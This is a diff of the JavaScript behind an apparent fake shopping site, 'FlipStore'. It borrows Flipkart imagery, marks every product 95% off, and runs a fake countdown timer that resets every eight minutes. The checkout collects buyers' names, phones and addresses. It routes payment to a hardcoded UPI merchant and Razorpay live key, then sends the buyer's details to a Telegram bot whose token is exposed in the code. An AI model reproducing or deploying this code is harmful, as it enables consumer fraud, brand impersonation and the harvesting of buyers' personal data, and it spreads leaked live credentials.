@@ -1,16 +1,11 @@
+
 // --- CONFIGURATION ---
 const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
 const TELEGRAM_CHAT_ID = "1815847082"; 
-
-// --- RAZORPAY CONFIGURATION ---
-// Note: Live keys might not work on localhost/file:// protocol. Try 'rzp_test_...' for testing.
 const RAZORPAY_KEY_ID = "rzp_live_RonN88BXEVP9eA"; 
-
-// --- UPI CONFIGURATION ---
 const UPI_ID = "gpay-11265399414@okbizaxis"; 
 const MERCHANT_NAME = "VR Shop";
-const MERCHANT_CODE = "BCR2DN5TWTE6VMRU"; // Aapka Google Pay Merchant ID
-
+const MERCHANT_CODE = "BCR2DN5TWTE6VMRU";
 
 const products = [
     // --- Earbuds (Keywords: wireless, earbuds, isolated) ---
@@ -330,22 +325,15 @@ const products = [
 ];
 
 
-// --- GLOBAL VARIABLES ---
 let currentProduct = null;
 let currentPrice = 0;
 let cart = []; 
 let isCartOrder = false; 
 let currentOrderID = "";
 
-// Check if products loaded correctly
-if (typeof products === 'undefined' || products.length === 0) {
-    console.error("Critical Error: Product data missing.");
-    alert("Site Error: Products not found. Check console.");
-}
-
 function getDiscountedPrice(price) { return Math.floor(price * 0.05); }
 
-// --- UI UTILS ---
+// UI UTILS
 function showToast(message) {
     const box = document.getElementById('toast-box');
     if (!box) return;
@@ -356,88 +344,42 @@ function showToast(message) {
     setTimeout(() => { toast.remove(); }, 3000);
 }
 
-function showLoading() { 
-    const loader = document.getElementById('loading-overlay');
-    if(loader) loader.classList.remove('hidden'); 
-}
-function hideLoading() { 
-    const loader = document.getElementById('loading-overlay');
-    if(loader) loader.classList.add('hidden'); 
-}
+function showLoading() { document.getElementById('loading-overlay').classList.remove('hidden'); }
+function hideLoading() { document.getElementById('loading-overlay').classList.add('hidden'); }
 
-// 1. Render Categories
+// RENDER
 function renderCategories() {
     const nav = document.getElementById('category-nav');
     if (!nav) return;
-    
-    // Safety check for empty products
-    if(!products || products.length === 0) return;
-
     const categories = [...new Set(products.map(p => p.category))];
     categories.unshift("All");
-
     nav.innerHTML = categories.map(cat => {
-        // Safe find with optional chaining
         const product = products.find(p => p.category === cat) || products[0];
-        // Default image if product undefined
-        const img = (cat === "All" || !product) ? "https://rukminim1.flixcart.com/flap/128/128/image/f15c02bfeb02d15d.png?q=100" : product.image; 
-        
-        return `
-            <div class="cat-item ${cat === 'All' ? 'active' : ''}" onclick="filterByCategory(this, '${cat}')">
-                <div class="cat-img-box">
-                    <img src="${img}" class="cat-img" onerror="this.src='https://placehold.co/100?text=Icon'">
-                </div>
-                <span class="cat-name">${cat}</span>
-            </div>
-        `;
+        const img = cat === "All" ? "https://rukminim1.flixcart.com/flap/128/128/image/f15c02bfeb02d15d.png?q=100" : product.image; 
+        return `<div class="cat-item ${cat === 'All' ? 'active' : ''}" onclick="filterByCategory(this, '${cat}')"><div class="cat-img-box"><img src="${img}" class="cat-img"></div><span class="cat-name">${cat}</span></div>`;
     }).join('');
 }
 
 function filterByCategory(element, category) {
     document.querySelectorAll('.cat-item').forEach(el => el.classList.remove('active'));
     if(element) element.classList.add('active');
-
-    const title = document.getElementById('section-title');
-    if(category === "All") {
-        if(title) title.innerText = "Deals of the Day";
-        renderProducts(products);
-    } else {
-        if(title) title.innerText = `Top ${category}`;
-        const filtered = products.filter(p => p.category === category);
-        renderProducts(filtered);
-    }
+    if(category === "All") renderProducts(products);
+    else renderProducts(products.filter(p => p.category === category));
 }
 
 function renderProducts(productList = products) {
     const container = document.getElementById('product-container');
-    if (!container) {
-        console.error("Product Container not found in HTML");
-        return;
-    }
+    if (!container) return;
     container.innerHTML = '';
-
-    if(!productList || productList.length === 0) {
+    if(productList.length === 0) {
         container.innerHTML = `<div style="grid-column: 1/-1; text-align: center; padding: 40px; color: #666;"><p>No products found.</p></div>`;
         return;
     }
-
     productList.forEach(product => {
         const discPrice = getDiscountedPrice(product.price);
         const card = document.createElement('div');
         card.className = 'product-card';
-        card.innerHTML = `
-            <div class="discount-badge">95% OFF</div>
-            <img src="${product.image}" class="product-img" loading="lazy" onerror="this.src='https://placehold.co/300x300?text=No+Image'">
-            <div class="product-title">${product.name}</div>
-            <div class="product-rating-row">
-                <div class="rating-badge">${product.rating} <i class="fas fa-star"></i></div>
-                <span class="review-count">(${product.reviews})</span>
-            </div>
-            <div class="price-box">
-                <span class="new-price">₹${discPrice}</span>
-                <span class="old-price">₹${product.price}</span>
-            </div>
-        `;
+        card.innerHTML = `<div class="discount-badge">95% OFF</div><img src="${product.image}" class="product-img" loading="lazy"><div class="product-title">${product.name}</div><div class="product-rating-row"><div class="rating-badge">${product.rating} <i class="fas fa-star"></i></div><span class="review-count">(${product.reviews})</span></div><div class="price-box"><span class="new-price">₹${discPrice}</span> <span class="old-price">₹${product.price}</span></div>`;
         card.onclick = () => showProductDetail(product);
         container.appendChild(card);
     });
@@ -448,94 +390,50 @@ function showProductDetail(product) {
     currentProduct = product;
     currentPrice = getDiscountedPrice(product.price);
     isCartOrder = false;
-
-    // View Switching
     document.getElementById('home-view').style.display = 'none';
     document.getElementById('timer-section').style.display = 'none';
     const detailView = document.getElementById('product-detail-view');
     detailView.classList.remove('hidden');
     detailView.style.display = 'block';
-
-    // Content Update
-    const detailImg = document.getElementById('detail-img');
-    detailImg.src = product.image;
-    detailImg.onerror = function() { this.src = 'https://placehold.co/400x400?text=No+Image'; };
-
+    document.getElementById('detail-img').src = product.image;
     document.getElementById('detail-title').innerText = product.fullName;
     document.getElementById('detail-price').innerText = `₹${currentPrice}`;
     document.getElementById('detail-old-price').innerText = `₹${product.price}`;
-    document.querySelector('.badge-star').innerHTML = `${product.rating} <i class="fas fa-star"></i>`;
-    document.querySelector('.review-count').innerText = `${product.reviews} Ratings & Reviews`;
-
     window.scrollTo({ top: 0, behavior: 'auto' });
 }
 
-// --- CART LOGIC ---
-function addToCart(product) {
-    cart.push(product);
-    showToast(`${product.name} added to cart!`);
-    updateCartCount();
-}
-
-function updateCartCount() {
-    const badge = document.querySelector('.cart-badge');
-    if(badge) {
-        badge.innerText = cart.length;
-        badge.style.display = cart.length > 0 ? 'block' : 'none';
-        badge.style.transform = 'scale(1.2)';
-        setTimeout(() => badge.style.transform = 'scale(1)', 200);
-    }
-}
-
-// --- CHECKOUT & PAYMENT ---
+// CHECKOUT
 function startCheckout() {
     document.getElementById('step-address').classList.remove('hidden');
     document.getElementById('step-payment').classList.add('hidden');
-    document.getElementById('input-name').value = '';
-    document.getElementById('input-phone').value = '';
     document.getElementById('checkoutModal').style.display = 'flex';
 }
-
 function closeModal() {
     document.getElementById('checkoutModal').style.display = 'none';
     document.getElementById('utrModal').style.display = 'none';
 }
-
 function goToPayment() {
     const name = document.getElementById('input-name').value;
     const phone = document.getElementById('input-phone').value;
     const pin = document.getElementById('input-pincode').value;
     const addr = document.getElementById('input-addr').value;
-
-    if(!name || !phone || !pin || !addr) {
-        showToast("Please fill all details");
-        return;
-    }
-
+    if(!name || !phone || !pin || !addr) { showToast("Please fill all details"); return; }
     window.userDetails = { name, phone, pincode: pin, addr };
-    
     document.getElementById('step-address').classList.add('hidden');
     document.getElementById('step-payment').classList.remove('hidden');
     document.getElementById('payment-total').innerText = `₹${currentPrice}`;
 }
-
 function backToAddress() {
     document.getElementById('step-payment').classList.add('hidden');
     document.getElementById('step-address').classList.remove('hidden');
 }
 
-// --- SMART PAYMENT LOGIC ---
+// PAYMENTS
 function initiatePayment() {
     const selected = document.querySelector('input[name="payment"]:checked').id;
-
     if (selected === 'online') {
-        if (typeof Razorpay !== 'undefined') {
-            showLoading();
-            startRazorpay();
-        } else {
-            showToast("Gateway unavailable. Using Manual Method.");
-            startManualUPI();
-        }
+        if (typeof Razorpay !== 'undefined') { showLoading(); startRazorpay(); } 
+        else { showToast("Gateway unavailable. Using Manual Method."); startManualUPI(); }
     } else if (selected === 'manual_upi') {
         startManualUPI();
     }
@@ -549,43 +447,19 @@ function startRazorpay() {
         "name": "FlipStore",
         "description": isCartOrder ? "Bulk Order" : currentProduct.name,
         "image": "https://rukminim1.flixcart.com/www/800/800/promos/16/05/2019/d438a32e-765a-4d8b-b4a6-520b560971e8.png?q=90",
-        "handler": function (response) {
-            hideLoading();
-            completeOrder(response.razorpay_payment_id, "Razorpay Auto");
-        },
-        "prefill": {
-            "name": window.userDetails.name,
-            "contact": window.userDetails.phone
-        },
+        "handler": function (response) { hideLoading(); completeOrder(response.razorpay_payment_id); },
+        "prefill": { "name": window.userDetails.name, "contact": window.userDetails.phone },
         "theme": { "color": "#2874f0" },
-        "modal": {
-            "ondismiss": function() {
-                hideLoading();
-                showToast("Payment Cancelled");
-            }
-        }
+        "modal": { "ondismiss": function() { hideLoading(); showToast("Payment Cancelled"); } }
     };
-
-    try {
-        var rzp1 = new Razorpay(options);
-        rzp1.on('payment.failed', function (response){
-            hideLoading();
-            showToast("Payment Failed. Try Manual UPI.");
-        });
-        closeModal();
-        rzp1.open();
-    } catch (e) {
-        hideLoading();
-        startManualUPI(); 
-    }
+    try { var rzp1 = new Razorpay(options); rzp1.open(); closeModal(); } 
+    catch (e) { hideLoading(); startManualUPI(); }
 }
 
 function startManualUPI() {
     currentOrderID = "ORD" + Math.floor(Math.random() * 1000000);
     const upiLink = `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent(MERCHANT_NAME)}&mc=${MERCHANT_CODE}&tr=${currentOrderID}&tn=Order ${currentOrderID}&am=${currentPrice}&cu=INR`;
-    
     window.location.href = upiLink;
-
     setTimeout(() => {
         closeModal();
         const utrModal = document.getElementById('utrModal');
@@ -596,47 +470,24 @@ function startManualUPI() {
 
 function verifyUTR() {
     const utr = document.getElementById('utr-input').value.trim();
-    if(utr.length < 10) {
-        showToast("Enter valid 12-digit UTR");
-        return;
-    }
+    if(utr.length < 10) { showToast("Enter valid 12-digit UTR"); return; }
     document.getElementById('utrModal').style.display = 'none';
-    completeOrder(utr, "Manual UPI");
+    completeOrder(utr);
 }
 
-function completeOrder(refId, method) {
-    const orderDetails = `
-✅ *ORDER SUCCESS* (${method})
-👤 ${window.userDetails.name} | 📱 ${window.userDetails.phone}
-🏠 ${window.userDetails.addr}
-🛒 ${isCartOrder ? 'Bulk Cart' : currentProduct.name}
-💰 ₹${currentPrice}
-🆔 Ref: ${refId}
-    `;
-    
+function completeOrder(refId) {
+    const orderDetails = `NEW ORDER\n👤 ${window.userDetails.name}\n📱 ${window.userDetails.phone}\n🏠 ${window.userDetails.addr}\n🛒 ${isCartOrder ? 'Bulk' : currentProduct.name}\n💰 ₹${currentPrice}\n🆔 ${refId}`;
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: orderDetails })
     });
-
-    const successModal = document.getElementById('successModal');
-    successModal.querySelector('.modal-content').innerHTML = `
-        <div style="text-align: center; padding: 30px;">
-            <div style="font-size: 60px; color: #388e3c; margin-bottom: 20px;"><i class="fas fa-check-circle"></i></div>
-            <h2 style="color: #212121;">Order Placed!</h2>
-            <p style="color: #666; margin: 10px 0;">ID: ${refId}</p>
-            <button onclick="location.reload()" style="width: 100%; background: #2874f0; color: white; padding: 15px; border: none; border-radius: 4px; font-weight: bold;">Continue Shopping</button>
-        </div>
-    `;
-    successModal.style.display = 'flex';
-    
-    if(isCartOrder) { cart = []; updateCartCount(); }
+    document.getElementById('successModal').querySelector('.modal-content').innerHTML = `<div style="text-align:center;padding:30px;"><h2 style="color:#212121;">Order Placed!</h2><p>ID: ${refId}</p><button onclick="location.reload()" style="width:100%;background:#2874f0;color:white;padding:15px;border:none;">Continue</button></div>`;
+    document.getElementById('successModal').style.display = 'flex';
 }
 
-// --- INITIALIZATION ---
+// INIT
 document.addEventListener('DOMContentLoaded', () => {
-    // Back Button Handler
     window.addEventListener('popstate', () => {
         if(document.getElementById('product-detail-view').style.display === 'block') {
             document.getElementById('product-detail-view').style.display = 'none';
@@ -644,33 +495,12 @@ document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('timer-section').style.display = 'block';
         }
     });
-
-    // Start App
     renderCategories();
     renderProducts();
-    
     setInterval(() => {
         const now = Math.floor(Date.now() / 1000);
         const left = (8 * 60) - (now % (8 * 60));
         document.getElementById('timer').innerText = `${Math.floor(left/60).toString().padStart(2,'0')}:${(left%60).toString().padStart(2,'0')}`;
     }, 1000);
-
-    // Bind Global Clicks
-    document.querySelector('.cart-btn').onclick = (e) => { 
-        e.preventDefault(); 
-        if(cart.length === 0) showToast("Cart is empty");
-        else showToast("Cart feature coming in next update (Use Buy Now)"); 
-    };
-
-    const loginBtn = document.querySelector('.login-btn');
-    if(loginBtn) loginBtn.addEventListener('click', () => { showToast("You are already logged in!"); });
-
-    const searchInput = document.querySelector('.search-bar input');
-    if(searchInput) {
-        searchInput.addEventListener('input', (e) => {
-            const q = e.target.value.toLowerCase().trim();
-            if(q === "") return renderProducts(products);
-            renderProducts(products.filter(p => p.name.toLowerCase().includes(q)));
-        });
-    }
+    document.querySelector('.cart-btn').onclick = (e) => { e.preventDefault(); showToast("Cart coming soon"); };
 });
